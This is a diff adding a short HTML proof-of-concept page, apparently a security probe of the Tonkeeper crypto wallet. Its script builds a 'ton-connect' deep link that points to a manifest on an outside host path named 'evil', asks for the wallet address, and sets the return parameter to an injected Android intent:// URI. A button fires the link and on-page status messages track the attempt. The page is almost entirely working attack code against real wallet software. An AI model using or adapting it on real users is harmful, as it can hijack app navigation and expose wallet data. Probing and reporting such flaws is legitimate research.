@@ -1,0 +1,13 @@
+<!doctype html><html><body style="font:14px monospace;padding:10px">
+<div id="s">RET-PROOF-BOOT</div>
+<script>
+var s=document.getElementById('s');
+var CID='603d5ef68d284266f2245f1182b25aae4be1b94cfb910692b00f9cbdd781b3fc';
+var R=encodeURIComponent(JSON.stringify({manifestUrl:'https://goodman387.github.io/evil/manifest.json',items:[{name:'ton_addr'}]}));
+var RET=encodeURIComponent('intent://SCAN-PROOF-RPT24#Intent;scheme=rpt24proof;package=com.ton_keeper;end');
+var dl='tonkeeper://ton-connect?v=2&id='+CID+'&r='+R+'&ret='+RET;
+s.textContent='RET-PROBE:LOADED';
+var btn=document.createElement('button');btn.textContent='LAUNCH CONNECT WITH ret=intent://';btn.style.cssText='font:20px monospace;padding:18px;width:100%;background:#f80';
+btn.onclick=function(){ s.textContent='RET-PROBE:NAVIGATING'; try{ window.location.href=dl; s.textContent='RET-PROBE:NAV_SENT'; }catch(e){ s.textContent='RET-PROBE:ERR '+e; } };
+document.body.appendChild(btn);
+</script></body></html>
